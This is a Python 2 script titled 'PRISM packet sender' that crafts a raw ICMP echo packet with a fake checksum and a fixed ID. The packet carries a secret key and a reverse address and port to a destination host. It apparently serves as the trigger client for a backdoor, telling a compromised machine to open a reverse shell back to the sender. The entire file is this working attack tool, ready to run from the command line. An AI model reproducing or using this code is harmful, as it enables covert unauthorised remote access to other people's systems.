#!/usr/bin/env python
"""
 * PRISM packet sender
 * 
 * Copyright (C) 2010-2013 Andrea Fabrizi <andrea.fabrizi@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
"""

import os
import sys
import socket
import struct
import select
import time
 
ICMP_ECHO_REQUEST = 8
 
def icmp_send(dest_addr, key, reverse_addr, reverse_port):

    icmp = socket.getprotobyname("icmp")

    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error, (errno, msg):
        if errno == 1:
            msg = msg + "This program must be run with root privileges."
            raise socket.error(msg)
        raise
 
    pkt_id = 0xABCD
    dest_addr  =  socket.gethostbyname(dest_addr)
    pkt_checksum = 55555

    command = key + " " + reverse_addr + " " + reverse_port 

    # Make a dummy heder with a fake checksum.
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, pkt_checksum, pkt_id, 1)
    bytesInDouble = struct.calcsize("d")
    data = command + " " + (192 - bytesInDouble - len(command) - 1) * "Q"
 
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))

    my_socket.close()

def usage(name):
    print "Usage:\n\t%s [DESTINATION_ADDRESS] [KEY] [REVERSE_ADDRESS] [REVERSE_PORT]" % name
    exit(1)
 
if __name__ == '__main__':

    args = sys.argv

    if len(args) != 5:
        usage(args[0])

    icmp_send(args[1], args[2], args[3], args[4])
